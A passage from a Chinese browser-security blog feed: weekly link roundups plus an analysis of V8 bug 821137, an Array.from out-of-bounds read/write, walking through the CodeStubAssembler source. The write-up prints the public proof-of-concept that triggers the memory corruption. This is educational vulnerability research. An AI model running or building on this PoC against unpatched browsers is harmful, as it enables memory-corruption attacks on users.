  &lt;li&gt;https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;支持一波我唐师傅，师傅开源了大量的Android漏洞分析文章，可惜现在不能跟师傅一起吃饭了，祝师傅前程似锦！&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/tangsilian/android-vuln&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以下来自玄武推送&lt;/p&gt;

&lt;p&gt;CVE-2017-5121 研究员babyJessica对V8的Escape Analysis逃逸分析过程漏洞的分析&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://exp101t.blogspot.com/2019/04/cve-2017-5121-escape-analysis.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019–0539 Microsoft Edge Chakra JIT类型混淆漏洞的分析&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://medium.com/@benoit.sevens/a-closer-beginners-look-at-cve-2019-0539-f2a801afa189&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;再聊两毛钱&lt;/p&gt;

&lt;p&gt;哎，最近跑路的师傅真多，我数了数，年后我认识的师傅跑了五个了，以后我可找谁约饭呐？&lt;/p&gt;

&lt;p&gt;五一带着媳妇回家浪了一圈&lt;/p&gt;

&lt;p&gt;回家就没有吃过大米饭：一号晚上酒店一大桌，二号中午爷爷奶奶家一大桌，二号晚上海鲜楼一大桌，三号中午和晚上外公外婆家一大桌，肚子就没有空过，还好四号早上跑路了&lt;/p&gt;

&lt;p&gt;焦虑，胖了，懒了，怠惰了&lt;/p&gt;
</description>
                <pubDate>Fri, 03 May 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/05/03/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.04.29-2019.05.03.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/05/03/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.04.29-2019.05.03.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.04.22 - 2019.04.26</title>
                <description>&lt;p&gt;看了一篇关于JavaScriptCore的文章：《漏洞利用的艺术 攻击JavaScript引擎》，这篇文章是一篇翻译，上周的周报我说学习了一篇玄武实验室师傅写的JavaScriptCore的漏洞利用分析，其实就是这个洞，国外有人写了一篇英文的分析，然后我这周看的是这篇分析的翻译，玄武那篇是单独写的&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://www.phrack.org/papers/attacking_javascript_engines.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;今年Zer0con的议题有好些关于浏览器的，一直关注的大牛Stephen讲完后在推上面公开了PPT，真好&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://docs.google.com/presentation/d/1DJcWByz11jLoQyNhmOvkZSrkgcVhllIlCHmal1tGzaw/edit?usp=sharing&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在读一个专栏的文章：《How Blink Works 中文译文》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://zhuanlan.zhihu.com/p/52918538&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最近三年内Chromium的UXSS漏洞和漏洞缓解机制的分析&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://ai.google/research/pubs/pub48028&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;PJ0公开了一个Chromium整数溢出，第二个是Chromium官方Issue，目前不能访问&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1793&lt;/li&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=938251&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;一篇0CTF关于JS引擎的漏洞分析，这篇文章我看完很有感悟，我觉得我缺少作者能在拿到一个未知内部机制二进制文件的情况下，通过Poc，报错，一步步的捋清楚内部机制，再写漏洞利用的能力&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.anquanke.com/post/id/177270&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;玄武实验室推了一篇比较涨知识的文章，关于Chromium的Courgette如何利用反汇编机制缩小安装包体积&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.chromium.org/developers/design-documents/software-updates-courgette&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;再聊五毛钱别的：&lt;/p&gt;

&lt;p&gt;我在玄武看到一个跟浏览器没什么关系的文章，我觉得对自己个人而言非常重要了，讲的是逆向一个未知游戏文件格式&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.unknowncheats.me/forum/general-programming-and-reversing/332048-example-reversing-undocumented-game-file-format.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我想的是和上面说到一个0CTF那道题一样，我现在缺少这种精神，是的，是精神，我搞逆向也挺多年了，不管是纯汇编分析，F5辅助还是动态打Hook我都掌握的还行，能力不是问题，可是现在就是缺少自己主动去逆向这些东西的精神，这个东西短期内搞得出来还成，搞不出来，业务产出就凉凉（干啥前都要掂量一下产出这种心理我已经在极力的克服了）&lt;/p&gt;

&lt;p&gt;因为我原先并不是漏洞方向，所以最近把JS课程弄完，跟着走一遍Linux下的漏洞利用，相关教程还是蛮多的，快速上手不是问题&lt;/p&gt;

&lt;p&gt;再说一句，今天好些个朋友找我问*ctf的一道V8，我还在想着缺少这种主动探索未知的精神咋办呢，刚好自己独立干一波！&lt;/p&gt;
</description>
                <pubDate>Fri, 26 Apr 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/04/26/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.04.22-2019.04.26.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/04/26/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.04.22-2019.04.26.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.04.15 - 2019.04.19</title>
                <description>&lt;p&gt;上周学习了CodeStubAssembler语法之后，这周重新分析了之前的CRBUG-821137&lt;/p&gt;

&lt;p&gt;这个洞属于Builtin漏洞，在完成迭代，设置返回数组长度的时候未考虑传入数组的长度会在迭代结束的时候被修改，导致一个数组越界读写&lt;/p&gt;

&lt;p&gt;具体可以翻博客，也可以看前面一篇公众号文章&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://couplee.wang/wnagzihxa1n/BrowserSecurity/V8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BCRBUG-821137/article.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;学习了V8字节码相关的内容&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://zhuanlan.zhihu.com/p/28590489&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;学习了JavaScriptCore的漏洞利用，从玄武的师傅们那里学了很多浏览器的漏洞分析和利用姿势，感谢玄武实验室的大佬们！&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://docs.ioin.in/writeup/drops.wiki/&lt;em&gt;index_php_2016_12_10_jscpwn&lt;/em&gt;/index.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;看了两篇EDGE的零基础漏洞利用教程，之前我分析过一些IE的漏洞，也写了几个Exp，所以大概知道是怎么回事，不过没有搞的很深入，后来就专心往V8走了&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.anquanke.com/post/id/175722&lt;/li&gt;
  &lt;li&gt;https://www.anquanke.com/post/id/175722&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2018-18500 Firefox的UAF漏洞Poc&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/sophoslabs/CVE-2018-18500&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;学习了JS一些特性和技巧&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://segmentfault.com/a/1190000018897633&quot;&gt;11个教程中不常被提及的JavaScript小技巧&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;特殊构造的.mht文件触发IE 11的XML外部实体注入漏洞，玄武推送也提到了这个洞：Edge会给下载的文件添加Capability SID——Microsoft.MicrosoftEdge_8wekyb3d8bbwe的可读权限，从而允许Renderer能够读取下载文件，但当下载文件在IE中打开时，此特性反而影响了正常的检查逻辑，导致文件的MOTW标记未能在IE中生效，由此导致下载的*.mht等文件格式在IE中渲染时可导致XXE攻击&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://sploitus.com/exploit?id=EDB-ID:46690&lt;/li&gt;
  &lt;li&gt;https://www.bleepingcomputer.com/news/security/microsoft-edge-file-permissions-clash-with-ie-allow-xxe-attacks/#.XLdqpcDDL6s.twitter&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以下来自玄武推送：&lt;/p&gt;

&lt;p&gt;JS中的反序列化漏洞以及攻击的新方法&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://agrrrdog.blogspot.com/2018/07/deserialization-vulnerabilities.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ZDI对Pwn2Own 2019中打Firefox的两个JIT漏洞的简单分析&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.zerodayinitiative.com/blog/2019/4/18/the-story-of-two-winning-pwn2own-jit-vulnerabilities-in-mozilla-firefox&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最后放个和浏览器没有关系的，因为我目前要把JS学的比较深入，所以最近看这些JS特性和进阶相关的东西比较多&lt;/p&gt;

&lt;p&gt;深入理解JavaScript Prototype污染攻击&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.freebuf.com/articles/web/200406.html&lt;/li&gt;
&lt;/ul&gt;
</description>
                <pubDate>Fri, 19 Apr 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/04/19/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.04.15-2019.04.19.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/04/19/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.04.15-2019.04.19.html</guid>
            </item>
        
            <item>
                <title>V8漏洞分析 - BUG-821137 Array.from OOB</title>
                <description>&lt;p&gt;Issue 821137: OOB read/write using Array.prototype.from&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=821137&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Poc&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;let oobArray = [];
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ =&amp;gt; (
    {
        counter : 0,
        max : 1024 * 1024 * 8,
        next() {
            let result = this.counter++;
            if (this.counter == this.max) {
                oobArray.length = 0;
                return {done: true};
            } else {
                return {value: result, done: false};
            }
        }
    }
) });
oobArray[oobArray.length - 1] = 0x41414141;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;搞V8也有段时间了，网上的资料说多不多，说少也不少，很多很基础的东西我都是尽量自己去搜，我觉得搞V8的一个很关键的点在于如何把Poc在V8里的&lt;strong&gt;执行过程&lt;/strong&gt;对应上&lt;/p&gt;

&lt;p&gt;今天我们拿一个品相不错的洞来分析&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d%5E%21/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;拿到parent的hash&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/40C2FF1E7B4E6325CBB12C69AC01B976.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们下载好源码之后，切换到漏洞commit&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;v8 git:(master) ✗ git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599
Checking out files: 100% (5182/5182), done.
HEAD is now at 1dab065bb4 [errors] Give a more informative error message for `new Map(1)`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后用工具打开分析源码，不要在意为什么我定位在这里&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/AB2B5509D484EC92B117BD84D0580EA8.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在V8里，会有一些常用函数会被&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;builtin&lt;/code&gt;，路径在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v8/src/builtins/&lt;/code&gt;下，我们以上图里的函数为例，这段代码所在文件为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v8/src/builtins/builtins-array-gen.cc&lt;/code&gt;，这是一种DSL，全名为：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Domain-Specific Language&lt;/code&gt;，领域特定语言&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// ES #sec-array.from
TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) {
    TNode&amp;lt;Context&amp;gt; context = CAST(Parameter(BuiltinDescriptor::kContext));
    TNode&amp;lt;Int32T&amp;gt; argc = UncheckedCast&amp;lt;Int32T&amp;gt;(Parameter(BuiltinDescriptor::kArgumentsCount));

    CodeStubArguments args(this, ChangeInt32ToIntPtr(argc));

    // 获取map_function
    TNode&amp;lt;Object&amp;gt; map_function = args.GetOptionalArgumentValue(1);

    // If map_function is not undefined, then ensure it's callable else throw.
    {
        // 创建label分支用于跳转
        Label no_error(this), error(this);
        // 如果未定义则跳到no_error分支
        GotoIf(IsUndefined(map_function), &amp;amp;no_error);
        // 如果是Smi类型则跳到error分支，这里涉及到了对象的存储，后面会写，简单来说指针类型最后一位是1
        GotoIf(TaggedIsSmi(map_function), &amp;amp;error);
        // 分支，map_function可调用跳到no_error，不可调用跳到error
        Branch(IsCallable(map_function), &amp;amp;no_error, &amp;amp;error);

        // error分支
        BIND(&amp;amp;error);
        // 抛出异常
        ThrowTypeError(context, MessageTemplate::kCalledNonCallable, map_function);

        // no_error分支
        BIND(&amp;amp;no_error);
    }

    // 创建是否可迭代分支
    Label iterable(this), not_iterable(this), finished(this), if_exception(this);

    TNode&amp;lt;Object&amp;gt; this_arg = args.GetOptionalArgumentValue(2);
    TNode&amp;lt;Object&amp;gt; items = args.GetOptionalArgumentValue(0);
    // The spec doesn't require ToObject to be called directly on the iterable
    // branch, but it's part of GetMethod that is in the spec.
    TNode&amp;lt;JSReceiver&amp;gt; array_like = ToObject(context, items);

    TVARIABLE(Object, array);
    TVARIABLE(Number, length);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这段代码为一种叫作&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CodeStubAssembler&lt;/code&gt;的DSL，V8官方博客有对这种语言的使用介绍&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://v8.dev/blog/csa&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我们可以读一下这段代码，其实挺简单的，注释我都写好了&lt;/p&gt;

&lt;p&gt;在理解了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CodeStubAssembler&lt;/code&gt;大概的语法之后&lt;/p&gt;

&lt;p&gt;我们可以开始讲今天的漏洞&lt;/p&gt;

&lt;p&gt;首先来看Poc，先创建了一个数组，然后对这个数组做&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Array.from()&lt;/code&gt;调用，里面重新定义了迭代函数&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;let oobArray = [];
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ =&amp;gt; (
    {
        counter : 0,
        max : 1024 * 1024 * 8,
        next() {
            let result = this.counter++;
            if (this.counter == this.max) {
                oobArray.length = 0;
                return {done: true};
            } else {
                return {value: result, done: false};
            }
        }
    }
) });
oobArray[oobArray.length - 1] = 0x41414141;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们来看这个函数的定义&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/from&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/9A0BF36012310FF93E5791C3AB5B2A10.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;也就是说，当我们传进去一个数组，它会再创建一个新的数组返回，并不会影响原来的数组&lt;/p&gt;

&lt;p&gt;来看代码，可以看到不会修改传入的数组&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;let array = [1, 2, 3];
let result = Array.from(array, x =&amp;gt; x + x);
console.log(array);
console.log(result);

&amp;gt; Array [1, 2, 3]
&amp;gt; Array [2, 4, 6]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;但是按照Poc里的写法，就可以对原有数组做修改，成功改掉了传入的数组&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;let array = [1, 2, 3];
Array.from.call(function() { return array }, {[Symbol.iterator] : _ =&amp;gt; (
    {
        counter : 0,
        max : 10,
        next() {
            let result = this.counter++;
            if (this.counter == this.max) {
                return {done: true};
            } else {
                return {value: result, done: false};
            }
        }
    }
) });
console.log(array);

&amp;gt; Array [0, 1, 2, 3, 4, 5, 6, 7, 8]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;换句话来说，我们CSA代码里，改的也是传入的数组本身，感慨JS还是要深入学习，不然这种特性我是肯定想不到的&lt;/p&gt;

&lt;p&gt;这也解释了为什么我们传入的第一个参数是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function() { return array }&lt;/code&gt;这样的写法而不是直接传入一个数组变量&lt;/p&gt;

&lt;p&gt;第二个参数涉及到了迭代的问题，大概的语法可以看出来，主要是实现&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next()&lt;/code&gt;函数，这里的逻辑是循环&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;max&lt;/code&gt;次，把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;counter++&lt;/code&gt;作为返回值，注意看两个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;return&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;done&lt;/code&gt;为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;表示迭代完成，这里由&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;this.counter == this.max&lt;/code&gt;判断，注意我们现在是在重写迭代函数，所以可以随意写迭代逻辑和迭代次数&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{[Symbol.iterator] : _ =&amp;gt; (
    {
        counter : 0,
        max : 10,
        next() {
            let result = this.counter++;
            if (this.counter == this.max) {
                return {done: true};
            } else {
                return {value: result, done: false};
            }
        }
    }
) }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;再来看Poc，我们先创建了一个数组&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;oobArray&lt;/code&gt;，之后的写法我们上面解释过，迭代次数为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1024 * 1024 * 8&lt;/code&gt;，唯一不同的是我们在迭代结束后，改掉了数组的长度&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;let oobArray = [];
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ =&amp;gt; (
    {
        counter : 0,
        max : 1024 * 1024 * 8,
        next() {
            let result = this.counter++;
            if (this.counter == this.max) {
                oobArray.length = 0;
                return {done: true};
            } else {
                return {value: result, done: false};
            }
        }
    }
) });
oobArray[oobArray.length - 1] = 0x41414141;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们来思考下，在迭代里把数组的长度改为0或者说进行修改，会发生什么&lt;/p&gt;

&lt;p&gt;这需要开始看源码&lt;/p&gt;

&lt;p&gt;对应的源码就是我们刚刚看的那一段，JS里一部分数组操作写进了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;builtins&lt;/code&gt;，可以通过命名观察到，或者函数开头命名也行&lt;/p&gt;

&lt;p&gt;这里贴出了整个函数的代码，前面一部分我们已经分析过&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// ES #sec-array.from
TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) {
  TNode&amp;lt;Context&amp;gt; context = CAST(Parameter(BuiltinDescriptor::kContext));
  TNode&amp;lt;Int32T&amp;gt; argc =
      UncheckedCast&amp;lt;Int32T&amp;gt;(Parameter(BuiltinDescriptor::kArgumentsCount));

  CodeStubArguments args(this, ChangeInt32ToIntPtr(argc));

  TNode&amp;lt;Object&amp;gt; map_function = args.GetOptionalArgumentValue(1);

  // If map_function is not undefined, then ensure it's callable else throw.
  {
    Label no_error(this), error(this);
    GotoIf(IsUndefined(map_function), &amp;amp;no_error);
    GotoIf(TaggedIsSmi(map_function), &amp;amp;error);
    Branch(IsCallable(map_function), &amp;amp;no_error, &amp;amp;error);

    BIND(&amp;amp;error);
    ThrowTypeError(context, MessageTemplate::kCalledNonCallable, map_function);

    // 跳到这里
    BIND(&amp;amp;no_error);
  }

  // 创建是否可迭代分支
  Label iterable(this), not_iterable(this), finished(this), if_exception(this);

  TNode&amp;lt;Object&amp;gt; this_arg = args.GetOptionalArgumentValue(2);
  TNode&amp;lt;Object&amp;gt; items = args.GetOptionalArgumentValue(0);
  // The spec doesn't require ToObject to be called directly on the iterable
  // branch, but it's part of GetMethod that is in the spec.
  TNode&amp;lt;JSReceiver&amp;gt; array_like = ToObject(context, items);

  TVARIABLE(Object, array);
  TVARIABLE(Number, length);

  // Determine whether items[Symbol.iterator] is defined:
  IteratorBuiltinsAssembler iterator_assembler(state());
  Node* iterator_method =
      iterator_assembler.GetIteratorMethod(context, array_like);
  Branch(IsNullOrUndefined(iterator_method), &amp;amp;not_iterable, &amp;amp;iterable);

  // 可迭代，或者说有迭代函数
  BIND(&amp;amp;iterable);
  {
    TVARIABLE(Number, index, SmiConstant(0));
    TVARIABLE(Object, var_exception);
    Label loop(this, &amp;amp;index), loop_done(this),
        on_exception(this, Label::kDeferred),
        index_overflow(this, Label::kDeferred);

    // Check that the method is callable.
    {
      Label get_method_not_callable(this, Label::kDeferred), next(this);
      GotoIf(TaggedIsSmi(iterator_method), &amp;amp;get_method_not_callable);
      GotoIfNot(IsCallable(iterator_method), &amp;amp;get_method_not_callable);
      Goto(&amp;amp;next);

      BIND(&amp;amp;get_method_not_callable);
      ThrowTypeError(context, MessageTemplate::kCalledNonCallable,
                     iterator_method);

      BIND(&amp;amp;next);
    }

    // 创建输出数组，也就是一开始我们看到的result数组，用于保存迭代结果，此时为空
    // 由于我们的骚操作，此时就是传入的数组本身
    // Construct the output array with empty length.
    array = ConstructArrayLike(context, args.GetReceiver());

    // Actually get the iterator and throw if the iterator method does not yield
    // one.
    IteratorRecord iterator_record =
        iterator_assembler.GetIterator(context, items, iterator_method);

    TNode&amp;lt;Context&amp;gt; native_context = LoadNativeContext(context);
    TNode&amp;lt;Object&amp;gt; fast_iterator_result_map =
        LoadContextElement(native_context, Context::ITERATOR_RESULT_MAP_INDEX);

    Goto(&amp;amp;loop);

    // 开始迭代
    BIND(&amp;amp;loop);
    {
      // Loop while iterator is not done.
      TNode&amp;lt;Object&amp;gt; next = CAST(iterator_assembler.IteratorStep(
          context, iterator_record, &amp;amp;loop_done, fast_iterator_result_map));
      TVARIABLE(Object, value,
                CAST(iterator_assembler.IteratorValue(
                    context, next, fast_iterator_result_map)));

      // If a map_function is supplied then call it (using this_arg as
      // receiver), on the value returned from the iterator. Exceptions are
      // caught so the iterator can be closed.
      {
        Label next(this);
        GotoIf(IsUndefined(map_function), &amp;amp;next);

        CSA_ASSERT(this, IsCallable(map_function));
        Node* v = CallJS(CodeFactory::Call(isolate()), context, map_function,
                         this_arg, value.value(), index.value());
        GotoIfException(v, &amp;amp;on_exception, &amp;amp;var_exception);
        value = CAST(v);
        Goto(&amp;amp;next);
        BIND(&amp;amp;next);
      }

      // Store the result in the output object (catching any exceptions so the
      // iterator can be closed).
      Node* define_status =
          CallRuntime(Runtime::kCreateDataProperty, context, array.value(),
                      index.value(), value.value());
      GotoIfException(define_status, &amp;amp;on_exception, &amp;amp;var_exception);

      index = NumberInc(index.value());

      // The spec requires that we throw an exception if index reaches 2^53-1,
      // but an empty loop would take &amp;gt;100 days to do this many iterations. To
      // actually run for that long would require an iterator that never set
      // done to true and a target array which somehow never ran out of memory,
      // e.g. a proxy that discarded the values. Ignoring this case just means
      // we would repeatedly call CreateDataProperty with index = 2^53.
      CSA_ASSERT_BRANCH(this, [&amp;amp;](Label* ok, Label* not_ok) {
        BranchIfNumberRelationalComparison(Operation::kLessThan, index.value(),
                                           NumberConstant(kMaxSafeInteger), ok,
                                           not_ok);
      });
      Goto(&amp;amp;loop);
    }

    // 迭代结束
    BIND(&amp;amp;loop_done);
    {
      length = index; // index为迭代次数，也就是输出数组的length
      Goto(&amp;amp;finished); // 跳转到finished分支
    }

    BIND(&amp;amp;on_exception);
    {
      // Close the iterator, rethrowing either the passed exception or
      // exceptions thrown during the close.
      iterator_assembler.IteratorCloseOnException(context, iterator_record,
                                                  &amp;amp;var_exception);
    }
  }
  
  // 不可迭代或者没有迭代函数分支
  // Since there's no iterator, items cannot be a Fast JS Array.
  BIND(&amp;amp;not_iterable);
  {
    ......
  }

  // 迭代结束跳到这里
  BIND(&amp;amp;finished);

  // 设置输出数组的长度
  // Finally set the length on the output and return it.
  GenerateSetLength(context, array.value(), length.value());
  args.PopAndReturn(array.value());
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;对于代码里构造输出数组时我说就是传入的数组本身这个问题，我们可以验证一下，我们创建一个简单的数组，里面就一个元素，第一次迭代，进入else分支，此时还没有返回，所以输出的是原始数组，第二次迭代，此时第一次迭代的数据已经写进去，所以第一位被改掉为0，之后同理&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;let array = [1];
Array.from.call(function() { return array }, {[Symbol.iterator] : _ =&amp;gt; (
    {
        counter : 0,
        max : 10,
        next() {
            let result = this.counter++;
            if (this.counter == this.max) {
                return {done: true};
            } else {
                console.log(array);
                return {value: result, done: false};
            }
        }
    }
) });
console.log(array);

&amp;gt; Array [1]
&amp;gt; Array [0]
&amp;gt; Array [0, 1]
&amp;gt; Array [0, 1, 2]
&amp;gt; Array [0, 1, 2, 3]
&amp;gt; Array [0, 1, 2, 3, 4]
&amp;gt; Array [0, 1, 2, 3, 4, 5]
&amp;gt; Array [0, 1, 2, 3, 4, 5, 6]
&amp;gt; Array [0, 1, 2, 3, 4, 5, 6, 7]
&amp;gt; Array [0, 1, 2, 3, 4, 5, 6, 7, 8]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以如果我们传入的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1, 2, 3]&lt;/code&gt;，就会输出如下的数据&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; Array [1, 2, 3]
&amp;gt; Array [0, 2, 3]
&amp;gt; Array [0, 1, 3]
&amp;gt; Array [0, 1, 2]
&amp;gt; Array [0, 1, 2, 3]
&amp;gt; Array [0, 1, 2, 3, 4]
&amp;gt; Array [0, 1, 2, 3, 4, 5]
&amp;gt; Array [0, 1, 2, 3, 4, 5, 6]
&amp;gt; Array [0, 1, 2, 3, 4, 5, 6, 7]
